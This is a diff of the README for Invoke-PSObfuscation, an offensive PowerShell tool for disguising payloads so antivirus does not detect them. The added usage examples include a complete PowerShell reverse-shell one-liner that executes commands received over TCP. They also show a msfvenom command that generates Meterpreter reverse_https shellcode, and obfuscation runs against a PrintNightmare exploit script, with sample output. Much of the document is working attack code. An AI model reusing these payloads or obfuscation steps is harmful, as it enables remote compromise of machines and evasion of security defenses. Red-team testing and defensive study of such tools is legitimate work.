@@ -42,12 +42,6 @@ Switch ($Picker) {
 }
 ```
 
-## Coming Soon
-
-* Building out a cleaner Find-Variables function that will utilize [System.Management.Automation.PSParser]
-* Building out a safer version of Find-String which will include logic to skip massive strings
-* A reference guide on how to approach obfuscating larger and more complex payloads
-
 ## Requirements
 
 This framework and resulting payloads have been tested on the following operating system and PowerShell versions. 
@@ -60,19 +54,15 @@ This framework and resulting payloads have been tested on the following operatin
 
 The resulting reverse shells will not work on PowerShell v2.0. _Woah, where's the love for the older versions of PowerShell?_ Initially, my intention was to design this for the newer version of PowerShell. Depending on how well this tool is received, I am planning on making PowerShell v2.0 derivative of this tool called `Invoke-PS2Obfuscation`. 
 
-### Reverse Shell One-Liner
+## Coming Soon
 
-The original release of this script included logic to ask for the intended IP and port of the listener. This wasn't too helpful and has been removed. Instead, simply just add your listener details within the payload itself, which is what most people have been doing.
-
-```powershell
-$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
-```
-
-## Obfuscated One-Liner
-
-![Alt text](./screenshots/0bFu5c4t3d.jpg "0bFu5c4t3d")
+* Building out a cleaner Find-Variables function that will utilize [System.Management.Automation.PSParser]
+* Building out a safer version of Find-String which will include logic to skip massive strings
+* A reference guide on how to approach obfuscating larger and more complex payloads
 
 ## Usage Examples
+
+### CVE-2021-34527 (PrintNightmare)
 
 ```shell
 ┌──(tristram㉿kali)-[~]
@@ -84,7 +74,7 @@ https://aka.ms/powershell
 Type 'help' to get help.
 
 PS /home/tristram> . ./Invoke-PSObfuscation.ps1
-PS /home/tristram> Invoke-PSObfuscation -Path .\CVE-2021-34527.ps1 -Cmdlets -Comments -NamespaceClasses -Variables -OutFile o-printernightmare.ps1
+PS /home/tristram> Invoke-PSObfuscation -Path .\CVE-2021-34527.ps1 -Cmdlets -Comments -NamespaceClasses -Variables -OutFile o-printnightmare.ps1
 
      >> Layer 0 Obfuscation
      >> https://github.com/gh0x0st
@@ -106,15 +96,17 @@ PS /home/tristram> Invoke-PSObfuscation -Path .\CVE-2021-34527.ps1 -Cmdlets -Com
 [-] -PackingSize is now -0CB3X
 [-] -ExplicitLayout is now -YegeaeLpPnB
 [*] Removing comments
-[*] Writing payload to o-printernightmare.ps1
+[*] Writing payload to o-printnightmare.ps1
 [*] Done
 
 PS /home/tristram> 
 ```
 
-## Show Changes
+### PowerShell Reverse Shell
 
-One of my personal goals was to try to make it as easy I could for folks to identify how each flagged component was changed and the generator logic involved. To accomplish this, I added the `-ShowChanges` switch. This will instruct the script to output the specific generator number, the original value, and its obfuscated value to the screen. This way if you wanted to look at how it was built you could find it more easily within the main script itself.
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
 
 ```shell
 ┌──(tristram㉿kali)-[~]
@@ -143,6 +135,40 @@ PS /home/tristram> Invoke-PSObfuscation -Path ./revshell.ps1 -Integers -Cmdlets 
     Generator 2 >> New-Object >> & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_})
     Generator 1 >> Out-String >> & (("Tpltq1LeZGDhcO4MunzVC5NIP-vfWow6RxXSkbjYAU0aJm3KEgH2sFQr7i8dy9B")[13,16,3,25,35,3,55,57,17,49] -join '')
 [*] Writing payload to /home/tristram/obfuscated.ps1
+[*] Done
+```
+
+### Obfuscated PowerShell Reverse Shell
+
+![Alt text](./screenshots/0bFu5c4t3d.jpg "0bFu5c4t3d")
+
+### Meterpreter PowerShell Shellcode
+
+```shell
+┌──(tristram㉿kali)-[~]
+└─$ pwsh 
+PowerShell 7.1.3
+Copyright (c) Microsoft Corporation.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+PS /home/kali> msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=443 EXITFUNC=thread -f ps1 -o meterpreter.ps1
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 686 bytes
+Final size of ps1 file: 3385 bytes
+Saved as: meterpreter.ps1
+PS /home/kali> . ./Invoke-PSObfuscation.ps1                                                                                        
+PS /home/kali> Invoke-PSObfuscation -Path ./meterpreter.ps1 -Integers -Variables -OutFile o-meterpreter.ps1                     
+
+     >> Layer 0 Obfuscation
+     >> https://github.com/gh0x0st
+
+[*] Obfuscating integers
+[*] Obfuscating variables
+[*] Writing payload to o-meterpreter.ps1
 [*] Done
 ```
 
